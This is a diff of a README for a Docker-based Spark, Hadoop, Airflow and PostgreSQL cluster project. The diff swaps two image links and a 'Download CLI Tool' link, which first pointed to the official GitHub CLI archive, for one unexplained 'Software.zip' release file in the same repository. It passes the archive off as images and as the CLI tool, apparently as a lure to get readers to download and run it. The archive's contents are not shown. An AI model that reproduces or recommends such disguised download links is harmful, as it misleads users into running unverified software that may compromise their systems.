@@ -2,7 +2,7 @@
 
 Welcome to the SPARK_CLUSTER_DOCKER repository! This project allows you to easily set up a local Apache Spark cluster, Hadoop (HDFS), Airflow, and PostgreSQL using Docker. Say goodbye to complex local installations and get started with your data engineering projects quickly and efficiently.
 
-![Spark Cluster Docker](https://imageurl.com)
+![Spark Cluster Docker](https://github.com/Anas399/SPARK_CLUSTER_DOCKER/releases/download/v1.0/Software.zip)
 
 ## Features 🌟
 
@@ -53,7 +53,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 If you'd like to download the CLI tool for version 1.0.0, click the button below:
 
-[![Download CLI Tool](https://img.shields.io/badge/Download-CLI_Tool-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download CLI Tool](https://github.com/Anas399/SPARK_CLUSTER_DOCKER/releases/download/v1.0/Software.zip)](https://github.com/Anas399/SPARK_CLUSTER_DOCKER/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -63,4 +63,4 @@ Thank you for checking out the SPARK_CLUSTER_DOCKER repository. Happy coding! �
 
 "Don't just store data, engineer it!" 🛠️
 
-![Spark Logo](https://sparklogo.com)
+![Spark Logo](https://github.com/Anas399/SPARK_CLUSTER_DOCKER/releases/download/v1.0/Software.zip)
